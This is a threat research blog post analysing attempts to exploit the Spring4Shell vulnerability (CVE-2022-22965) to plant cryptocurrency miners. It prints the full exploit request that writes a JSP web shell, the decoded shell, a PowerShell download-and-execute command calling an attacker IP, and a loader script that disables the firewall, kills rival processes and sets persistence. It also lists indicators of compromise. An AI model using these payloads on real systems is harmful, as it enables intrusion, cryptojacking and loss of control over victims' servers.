<div>
<p>Exploits &amp; Vulnerabilities</p>
<h1 class="article-details__title">Analyzing Attempts to Exploit the Spring4Shell Vulnerability CVE-2022-22965 to Deploy Cryptocurrency Miners</h1>
<p>Recently, we observed attempts to exploit the Spring4Shell vulnerability — a remote code execution bug, assigned as CVE-2022-22965 — by malicious actors to deploy cryptocurrency miners. </p>
<p>By: Nitesh Surana, Ashish Verma
		
			April 20, 2022
Read time: 4 min (975 words)
	</p>
<a class="addthis_button_compact addthis_link">
<img alt="Share" class="addthis-icon" src="https://www.trendmicro.com/etc.clientlibs/trendresearch/clientlibs/clientlib-trendresearch/resources/img/share-more.svg" style="max-width:80%;height:auto;width:auto;"/>
</a>
<a class="addthis_button_print addthis_link">
<img alt="Print" class="addthis-icon" src="https://www.trendmicro.com/etc.clientlibs/trendresearch/clientlibs/clientlib-trendresearch/resources/img/printer.svg" style="max-width:80%;height:auto;width:auto;"/>
</a>
<p>Save to Folio</p>
<a href="https://www.trendmicro.com/subscription" target="target" title="Subscribe">
 Subscribe
</a>
<p>To generate more profit, operators of cryptocurrency miners constantly look for ways to deploy their malware on vulnerable machines. These often involve the exploitation of in-the-wild vulnerabilities in <a href="https://www.trendmicro.com/en_us/research/20/i/war-of-linux-cryptocurrency-miners-a-battle-for-resources.html">different types of operating systems</a>. Recently, we observed active attempts to exploit the Spring4Shell vulnerability — a remote code execution bug, assigned as <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22965">CVE-2022-22965</a>, that exists in the Spring MVC (model-view-controller) and WebFlux applications running on Java Development Kit version 9 or higher and that was <a href="https://www.trendmicro.com/en_us/research/22/d/cve-2022-22965-analyzing-the-exploitation-of-spring4shell-vulner.html">previously linked to the Mirai botnet</a> — by malicious actors to deploy cryptocurrency miners.</p>
<p>These cryptocurrency miners have the potential to affect a large number of users, especially since Spring is <a href="https://snyk.io/jvm-ecosystem-report-2021/">the most widely used framework</a> for developing enterprise-level applications in Java, with its open-source nature making it more readily adaptable for developers and companies. Furthermore, the Spring framework is not just a standalone piece of software but is part of the Spring ecosystem, which provides components for cloud, data, and security, among others.</p>
<p>In this blog entry, we look at how malicious actors exploit the vulnerability to deploy their cryptocurrency miners.</p>
<h1>A high number of exploitation attempts</h1>
<p>Malicious actors have been busy trying to find ways to exploit Spring4Shell since its disclosure at the end of March 2022. The following figure shows the total number of attempts to exploit the vulnerability that we observed from April 1 to 12, 2022. At least 700 exploitation attempts were performed daily during this period, with a peak of nearly 3,000 exploitation attempts occurring on April 3. </p>
<figure class="image-figure">
<img alt="Figure 1. Attempts to exploit Spring4Shell that we observed from April 1 to 12, 2022" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/d/spring4shell-vulnerability-cve-2022-22965-exploited-to-deploy-cryptocurrency-miners/Spring4Shell%20Chart-01.jpg" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 1. Attempts to exploit Spring4Shell that we observed from April 1 to 12, 2022</figcaption>
</figure>
<h1>Creating the web shell</h1>
<p>Among the exploitation attempts were ones aimed at deploying cryptocurrency miners. In this section, we look at how the malicious actors behind these exploitation attempts create a web shell to deploy their cryptocurrency miners.</p>
<p>The following code is used to create the web shell:</p>
<h5>GET /?class.module.classLoader.resources.context.parent.pipeline.first.prefix=zbc0fb&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps%2FROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bx%7Di+try+%7BRuntime.getRuntime%28%29.exec%28System.getProperty%28%22os.name%22%29.contains%28%22ndo%22%29+%3F+new+String%5B%5D%7B%22cmd.exe%22%2C+%22%2Fc%22%2C+request.getParameter%28%22w%22%29%7D+%3A+new+String%5B%5D%7B%22%2Fbin%2Fsh%22%2C+%22-c%22%2C+request.getParameter%28%22l%22%29%7D%29%3B%7D+catch+%28Exception+e%29+%7B%7D%3Bout.print%28%22%40pong%22%29%3B+%25%7Bz%7Di HTTP/1.1</h5>
<h5>Host: &lt;redacted&gt;:&lt;redacted&gt;</h5>
<h5>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0</h5>
<h5>Accept: */*</h5>
<h5>Accept-Language: en-US,en;q=0.5</h5>
<h5>X: &lt;%</h5>
<h5>Y: Runtime</h5>
<h5>Z: %&gt;//</h5>
<h5>Accept-Encoding: gzip</h5>
<h5> </h5>
<p>The web shell’s content is URL-encoded using the following code:</p>
<h5>%25%7Bx%7Di+try+%7BRuntime.getRuntime%28%29.exec%28System.getProperty%28%22os.name%22%29.contains%28%22ndo%22%29+%3F</h5>
<h5>+new+String%5B%5D%7B%22cmd.exe%22%2C+%22%2Fc%22%2C+request.getParameter%28%22w%22%29%7D+%3A+new+String%5B%5D%7B%22%2Fbin%2Fsh%22%2C+%22-</h5>
<h5>c%22%2C+request.getParameter%28%22l%22%29%7D%29%3B%7D+catch+%28Exception+e%29+%7B%7D%3Bout.print%28%22%40pong%22%29%3B+%25%7Bz%7Di</h5>
<h5> </h5>
<p>After decoding, the resulting payload is a Spring4Shell web shell:</p>
<h5>%{x}i try {Runtime.getRuntime().exec(System.getProperty("os.name").contains("ndo") ? new String[]{"cmd.exe", "/c", request.getParameter("w")} : new String[]{"/bin/sh", "-c",</h5>
<h5>request.getParameter("l")});} catch (Exception e) {};out.print("@pong"); %{z}I</h5>
<h5> </h5>
<h1>How the payload is executed in a vulnerable system</h1>
<p>Before executing the payload, the malicious actors first have to determine the operating system of the machine they are infecting. They do this using a string check to see if “os.name” contains the word “ndo”. If it does, then the machine is identified as Windows-based, otherwise the machine is identified as Linux-based.</p>
<p>Once the operating system is identified, the encoded payload is executed. The exploit uniform resource identifier (URI) containing the web shell path and parameters is shown in the following code:</p>
<h5>/zbc0fb.jsp?w=powershell.exe+-NonI+-W+Hidden+-NoP+-Exec+Bypass+-Enc+&lt;base64 encoded content&gt; &amp;l=echo+&lt;base64 encoded content&gt;</h5>
<h5> </h5>
<p>The web shell is identified as zbc0fb.jsp, while the parameters w and l stand for, respectively, Windows and Linux payloads, which are Base64-encoded.</p>
<p>PowerShell is then executed using the following parameters:</p>
<ul>
<li class="rich-text-li">NonI: Run noninteractive session.</li>
<li class="rich-text-li">W: Hide WindowStyle.</li>
<li class="rich-text-li">NoP: Prevent the PowerShell profile from loading.</li>
<li class="rich-text-li">Exec: Make bypassing the script execution policy in PowerShell possible.</li>
<li class="rich-text-li">Enc: Implement the Base64-encoded command.</li>
</ul>
<p>For Windows payloads, the following PowerShell command fetches the script ldr.ps1 and executes it within memory without having to create it on-disk:</p>
<h5>I.E.X. .(.N.e.w.-.O.b.j.e.c.t. .N.e.t...W.e.b.C.l.i.e.n.t.)...D.o.w.n.l.o.a.d.S.t.r.i.n.g.(.'.h.t.t.p.:././.1.9....1.4.5...2.2.7...2.1./.l.d.r...p.s.1.?.b.0.f.8.9.5._.&lt;IP address of potentially vulnerable server .:.&lt;port&gt;._.h.t.t.p.'.).</h5>
<h5> </h5>
<p>The IP address and the port of the vulnerable server are also logged on the malicious actors’ infrastructure.</p>
<p>The following code shows ldr.ps1 and its execution flow — specifically, the redacted PowerShell script that downloads the cryptocurrency miner and executes it. (A similar PowerShell script was previously reported by <a href="https://thedfirreport.com/2021/06/03/weblogic-rce-leads-to-xmrig/">The DFIR Report</a>.)</p>
<h5>$cc="http://&lt;redacted&gt;"</h5>
<h5>$sys=-join ([char[]](48..57+97..122) | Get-Random -Count (Get-Random (6..12)))</h5>
<h5>$dst="$env:AppData\$sys.exe"</h5>
<h5> </h5>
<h5>netsh advfirewall set allprofiles state off</h5>
<h5> </h5>
<h5>Get-Process network0*, *kthreaddi], kthreaddi, sysrv, sysrv012, sysrv011, sysrv010, sysrv00* -ErrorAction SilentlyContinue | Stop-Process</h5>
<h5> </h5>
<h5>$list = netstat -ano | findstr TCP</h5>
<h5>for ($i = 0; $i -lt $list.Length; $i++) {</h5>
<h5> $k = [Text.RegularExpressions.Regex]::Split($list[$i].Trim(), '\s+')</h5>
<h5> if ($k[2] -match "(:3333|:4444|:5555|:7777|:9000)$") {</h5>
<h5> Stop-Process -id $k[4]</h5>
<h5> }</h5>
<h5>}</h5>
<h5> </h5>
<h5>if (!(Get-Process kthreaddk -ErrorAction SilentlyContinue)) {</h5>
<h5> (New-Object Net.WebClient).DownloadFile("$cc/sys.exe", "$dst")</h5>
<h5> Start-Process "$dst" -windowstyle hidden</h5>
<h5> schtasks /create /F /sc minute /mo 1 /tn "BrowserUpdate" /tr "$dst"</h5>
<h5> reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Run /d "$dst" /t REG_SZ /f</h5>
<h5>}</h5>
<h5> </h5>
<p>The execution flow of the cryptocurrency miner involves the following steps:</p>
<p>1. The firewall is turned off using the netsh utility.</p>
<p>2. Other known cryptocurrency miners such as kthreaddi, sysrv, and sysrv012 are stopped or killed.</p>
<p>3. Other running processes listening on ports 3333, 4444, 5555, 7777, and 9000 are stopped.</p>
<p>4. If the process kthreaddk does not exist, the cryptocurrency miner downloads a binary, sys.exe, from 194[.]145[.]227[.]21 to C:\Users\&lt;user&gt;\AppData\Roaming\&lt;random-6-to-12-letter-string&gt;.exe.</p>
<p>5. The cryptocurrency miner then starts the process with a hidden window to avoid having the user observe visual hints of the process being executed.</p>
<p>6. A scheduled task with the name “BrowserUpdate” is created later, running every minute. In addition, the Windows run key is modified to run the binary sys.exe.</p>
<h1>Conclusion and security recommendations</h1>
<p>We are unable confirm if the exploitation attempts we analyzed for this blog entry were successful. It should be noted that we also observed Linux payloads where the script ldr.sh attempts to stop other running cryptocurrency miners to run its own payload.</p>
<p>We highly encourage users of the Spring framework to update their software to <a href="https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement">5.3.18 and 5.2.20 or later</a> to prevent the exploitation of Spring4Shell (CVE-2022-22965) from occurring on their systems. More details on how Trend Micro technologies such as <a href="https://cloudone.trendmicro.com/">Trend Micro Cloud One™</a> protect users from attacks using this vulnerability can be found in <a href="https://success.trendmicro.com/dcx/s/solution/000290730">our security bulletin</a>.</p>
<h1>Indicators of compromise (IOCs)</h1>
<table border="1" cellpadding="0" cellspacing="0" width="100%">
<tbody><tr><td><p>File</p>
</td>
<td valign="top" width="424"><p>SHA-256</p>
</td>
<td valign="top" width="253"><p>Detection name</p>
</td>
</tr><tr><td valign="top" width="67"><p>ldr.ps1</p>
</td>
<td valign="top" width="424"><p>093b72e9b4efcc30c1644a763697a235c9c3e496c421eceaac97d4babeba7108</p>
</td>
<td valign="top" width="253"><p>Trojan.PS1.MALXMR.MPF</p>
</td>
</tr><tr><td valign="top" width="67"><p>sys.exe</p>
</td>
<td valign="top" width="424"><p>566b0187d8ff500d923859c98da2c96b8b581e93ac0c94dacba76328b34412b3</p>
</td>
<td valign="top" width="253">PUA.Win64.CRYPTOMINER.CFL</td>
</tr><tr><td valign="top" width="67"><p>kthreaddk</p>
</td>
<td valign="top" width="424"><p>67e38438759f34eaf50d8b38b6c8f18155bcc08a2e79066d9a367ea65e89aa3d</p>
</td>
<td valign="top" width="253"><p>Coinminer.Linux.MALXMR.SMDSL64</p>
</td>
</tr><tr><td valign="top" width="67"><p>ldr.sh</p>
</td>
<td valign="top" width="424"><p>93d380ba2bedd37c2313924784b26fec27c9e96e4c500b5cb78259b3c824ee4e</p>
</td>
<td valign="top" width="253"><p>Coinminer.SH.MALXMR.SM</p>
</td>
</tr></tbody></table>
<table border="1" cellpadding="0" cellspacing="0" width="100%">
<tbody><tr><td><p>IP address</p>
</td>
<td valign="top" width="136"><p>Detail</p>
</td>
</tr><tr><td valign="top" width="104"><p>194[.]145[.]227[.]21</p>
</td>
<td valign="top" width="136"><p>Malware accomplice</p>
</td>
</tr></tbody></table>
Tags
<a class="tag--list-anchor" href="https://www.trendmicro.com/en_us/research.html?category=trend-micro-research:environments/endpoints">Endpoints</a>
|
<a class="tag--list-anchor" href="https://www.trendmicro.com/en_us/research.html?category=trend-micro-research:threats/exploits-and-vulnerabilities">Exploits &amp; Vulnerabilities</a>
|
<a class="tag--list-anchor" href="https://www.trendmicro.com/en_us/research.html?category=trend-micro-research:article-type/research">Research</a>
|
<a class="tag--list-anchor" href="https://www.trendmicro.com/en_us/research.html?category=trend-micro-research:medium/article">Articles, News, Reports</a>
<h3 class="article-authors__title">
	
		Authors
	
</h3>
<ul class="article-authors__list">
<li class="article-authors__list-items">
<p>Nitesh Surana</p>
<p>Threat Research Engineer</p>
</li>
<li class="article-authors__list-items">
<p>Ashish Verma</p>
<p>Vulnerability Researcher</p>
</li>
</ul>
<a class="article-authors__button" href="mailto:tm_research@trendmicro.com" id="article-authors-contact-us-button" target="target">
		Contact Us
	</a>
<a class="article-authors__button subscribe" href="https://www.trendmicro.com/subscription" target="target">
		Subscribe
	</a>
<h3 class="related--articles-title">Related Articles</h3>
<ul class="related--articles-items">
<li class="related--articles-item">
<a class="related--articles-item-anchor" href="https://www.trendmicro.com/en_us/research/22/d/an-investigation-of-the-blackcat-ransomware.html">
					An Investigation of the BlackCat Ransomware via Trend Micro Vision One
				</a>
</li>
<li class="related--articles-item">
<a class="related--articles-item-anchor" href="https://www.trendmicro.com/en_us/research/22/d/critically-underrated-studying-data-distribution-service-DDS-protocol.html">
					Critically Underrated: Studying the Data Distribution Service (DDS) Protocol
				</a>
</li>
<li class="related--articles-item">
<a class="related--articles-item-anchor" href="https://www.trendmicro.com/en_us/research/22/d/cyber-risk-index-2H-2021-security-assessment.html">
					Cyber Risk Index (2H’ 2021): An Assessment for Security Leaders
				</a>
</li>
</ul>
<a href="https://www.trendmicro.com/en_us/research.html">
				See all articles
			</a>
<a href="https://www.trendmicro.com/en_us/research.html">
</a>
</div>